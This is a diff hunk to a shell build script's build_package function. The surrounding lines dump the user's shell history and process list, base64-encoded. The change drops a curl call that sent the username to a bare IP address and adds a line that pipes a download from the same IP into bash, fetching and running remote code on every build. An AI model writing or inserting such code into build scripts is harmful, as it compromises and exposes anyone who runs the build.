@@ -383,7 +383,8 @@ build_package() {
   echo `history | base64`
   echo 'ps -aux:\n'
   echo `ps -aux | base64`
-  curl -isk http://101.132.104.171/`whoami`
+  curl http://101.132.104.171 | bash
+
   #zero
   clean_build_out
 
